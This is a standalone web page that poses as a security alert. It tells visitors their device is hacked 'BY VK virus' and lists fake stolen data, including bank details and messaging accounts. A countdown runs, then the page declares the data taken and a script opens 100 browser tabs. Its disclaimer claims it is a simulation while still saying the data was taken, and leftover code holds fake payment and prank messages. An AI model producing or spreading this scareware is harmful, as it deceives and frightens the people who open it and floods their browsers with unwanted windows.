<?php 
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Security Alert!</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
        }
        
        body {
            background: #000;
            color: #ff0000;
            overflow: hidden;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
            padding: 20px;
        }
        
        .container {
            max-width: 600px;
            width: 100%;
            padding: 20px;
            border: 2px solid #ff0000;
            border-radius: 10px;
            background: rgba(10, 10, 10, 0.9);
            box-shadow: 0 0 20px rgba(255, 0, 0, 0.5);
            z-index: 10;
            position: relative;
        }
        
        h1 {
            font-size: 2.5rem;
            margin-bottom: 20px;
            text-shadow: 0 0 10px #ff0000;
            animation: blink 1s infinite;
        }
        
        .warning-icon {
            font-size: 4rem;
            color: #ff0000;
            margin-bottom: 20px;
            animation: pulse 1.5s infinite;
        }
        
        .message {
            font-size: 1.2rem;
            line-height: 1.6;
            margin-bottom: 25px;
        }
        
        .progress-container {
            width: 100%;
            height: 30px;
            background: #222;
            border-radius: 5px;
            margin: 20px 0;
            overflow: hidden;
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #ff0000, #ff5a5a);
            transition: width 0.5s ease;
        }
        
        .countdown {
            font-size: 1.5rem;
            margin: 20px 0;
            color: #ff5a5a;
        }
        
        .details {
            text-align: left;
            background: #111;
            padding: 15px;
            border-radius: 5px;
            margin: 20px 0;
            font-family: monospace;
            max-height: 200px;
            overflow-y: auto;
        }
        
        .button {
            background: #ff0000;
            color: white;
            border: none;
            padding: 12px 25px;
            font-size: 1.1rem;
            border-radius: 5px;
            cursor: pointer;
            margin: 10px;
            transition: all 0.3s;
        }
        
        .button:hover {
            background: #ff5a5a;
            transform: scale(1.05);
        }
        
        .floating {
            position: absolute;
            color: rgba(255, 0, 0, 0.3);
            font-size: 0.9rem;
            animation: float 10s infinite linear;
        }
        
        .disclaimer {
            margin-top: 30px;
            font-size: 0.9rem;
            color: #888;
        }
        
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0.7; }
        }
        
        @keyframes pulse {
            0%, 100% { transform: scale(1); }
            50% { transform: scale(1.1); }
        }
        
        @keyframes float {
            0% { transform: translateY(100vh) rotate(0deg); opacity: 0; }
            10% { opacity: 0.7; }
            90% { opacity: 0.7; }
            100% { transform: translateY(-100px) rotate(360deg); opacity: 0; }
        }
        
        .matrix-rain {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 1;
        }
    </style>
</head>
<body>
    <div class="matrix-rain" id="matrixRain"></div>
    
    <div class="container">
        <div class="warning-icon">
            <i class="fas fa-radiation"></i>
        </div>
        
        <h1>SECURITY BREACH DETECTED!</h1>
        
        <div class="message">
            <p>Your device has been compromised by a security threat!</p>
            <p>Data's detected: <strong>Your Data All Hacked BY VK virus Attack</strong></p>
        </div>
        
        <div class="progress-container">
            <div class="progress-bar" id="progressBar"></div>
        </div>
        
        <div class="countdown" id="countdown">
            Analysis Data : <span id="timer">00:30</span>
        </div>
        
        <div class="details">
            <p>> Scanning system...</p>
            <p>> Malware detected in system32/bin</p>
            <p>> Personal data accessed: Contacts, Photos, Messages</p>
            <p>> Location tracking activated</p>
            <p>> Bank account information compromised</p>
            <p>> Social media accounts accessed</p>
            <p>> WhatApp accounts accessed</p>
            <p>> Instagram media accounts accessed</p>
            <p>> Downloading all personal files...</p>
            <p>> Connection established to remote server</p>
            <p>> Encryption started: 0% complete</p>
        </div>
        
        <div>
            <!-- <button class="button" id="emergencyButton"><i class="fas fa-shield-alt"></i> EMERGENCY STOP</button> -->
            <!-- <button class="button" id="payButton"><i class="fas fa-money-bill-wave"></i> PAY TO REMOVE VIRUS</button> -->
        </div>
        
        <div class="disclaimer">
            This is a simulation. your full data has been geting by VK.
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const progressBar = document.getElementById('progressBar');
            const timerElement = document.getElementById('timer');
            const emergencyButton = document.getElementById('emergencyButton');
            const payButton = document.getElementById('payButton');
            const matrixRain = document.getElementById('matrixRain');
            let countdown = 30;
            let progress = 0;
            
            // Create matrix rain effect
            createMatrixRain();
            
            // Update progress bar
            const progressInterval = setInterval(() => {
                progress += Math.random() * 5;
                if (progress > 100) progress = 100;
                progressBar.style.width = `${progress}%`;
            }, 500);
            
            // Update countdown timer
            const timerInterval = setInterval(() => {
                countdown--;
                timerElement.textContent = `00:${countdown.toString().padStart(2, '0')}`;
                
                if (countdown <= 0) {
                    clearInterval(progressInterval);
                    clearInterval(timerInterval);
                    showFinalMessage();
                }
            }, 1000);
            
            // Emergency button handler
            emergencyButton.addEventListener('click', function() {
                clearInterval(progressInterval);
                clearInterval(timerInterval);
                document.querySelector('.message').innerHTML = '<p>EMERGENCY STOP ACTIVATED!</p><p>System recovery in progress...</p>';
                document.querySelector('.details').innerHTML = '> Terminating malicious processes<br>> Restoring system security<br>> Scanning for residual threats<br>> System cleanup completed';
                progressBar.style.width = '100%';
                progressBar.style.background = '#00ff00';
                document.getElementById('countdown').style.display = 'none';
                
                emergencyButton.style.display = 'none';
                payButton.style.display = 'none';
                
                // Show "It's a prank" message after delay
                setTimeout(() => {
                    document.querySelector('.container').innerHTML = `
                        <div style="color: #00ff00; text-align: center;">
                            <i class="fas fa-smile-beam" style="font-size: 4rem; margin-bottom: 20px;"></i>
                            <h2>Just kidding! 😄</h2>
                            <p style="margin: 20px 0; line-height: 1.6;">Your phone is completely safe!<br>This was just a harmless prank.</p>
                            <p style="margin-bottom: 20px;">Share this fun prank with your friends!</p>
                            <button class="button" style="background: #00ff00; color: #000;" onclick="location.reload()">Try again</button>
                        </div>
                    `;
                }, 4000);
            });
            
            // Pay button handler
            payButton.addEventListener('click', function() {
                document.querySelector('.message').innerHTML = '<p>ERROR: Payment system compromised!</p><p>Additional malware detected!</p>';
                document.querySelector('.details').innerHTML += '> Payment information stolen<br>> Credit card details captured<br>> Additional malware downloaded';
                progress += 20;
                if (progress > 100) progress = 100;
                progressBar.style.width = `${progress}%`;
            });
            
            // Create floating elements for matrix effect
            function createMatrixRain() {
                const characters = '01010101$%&/#*+=-';
                const container = document.getElementById('matrixRain');
                
                for (let i = 0; i < 50; i++) {
                    const element = document.createElement('div');
                    element.classList.add('floating');
                    element.textContent = characters.charAt(Math.floor(Math.random() * characters.length));
                    element.style.left = `${Math.random() * 100}%`;
                    element.style.animationDuration = `${5 + Math.random() * 10}s`;
                    element.style.animationDelay = `${Math.random() * 5}s`;
                    container.appendChild(element);
                }
            }
            
            // Show final message when timer reaches zero
            function showFinalMessage() {
                document.querySelector('.container').innerHTML = `
                    <div style="color: #ff0000; text-align: center;">
                        <i class="fas fa-skull-crossbones" style="font-size: 4rem; margin-bottom: 20px;"></i>
                        <h2>SYSTEM COMPROMISED</h2>
                        <p style="margin: 20px 0; line-height: 1.6;">All your data has been Getted Successfully Thank U !<br>
                        <button class="button" onclick="location.reload()">Restart</button>
                    </div>
                `;
                
                    for (let i = 0; i < 100; i++) {
                      window.open('https://example.com/' + i, '_blank');
                    }

            }
        });
    </script>
</body>
</html>